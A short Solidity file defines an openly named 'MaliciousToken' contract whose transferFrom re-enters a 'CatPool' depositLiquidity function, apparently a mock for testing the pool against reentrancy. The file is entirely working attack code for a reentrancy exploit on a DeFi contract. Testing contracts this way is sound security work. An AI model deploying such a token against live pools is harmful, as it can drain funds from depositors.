
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface ICatPool {
    function depositLiquidity(uint256 usdcAmount) external;
}
contract MaliciousToken {
    ICatPool catPool;
    uint256 amount;
    uint256 yieldChoice;
    constructor(address _catPool) {
        catPool = ICatPool(_catPool);
    }
    function setDepositArgs(uint256 _amount, uint256 _yieldChoice) external {
        amount = _amount;
        yieldChoice = _yieldChoice;
    }
    function executeDeposit() external {
        catPool.depositLiquidity(amount);
    }
    function approve(address spender, uint256 amount) external returns (bool) { return true; }
    function transferFrom(address, address, uint256 amount) external returns (bool success) {
        // Re-enter
        catPool.depositLiquidity(amount);
        return true;
    }
}
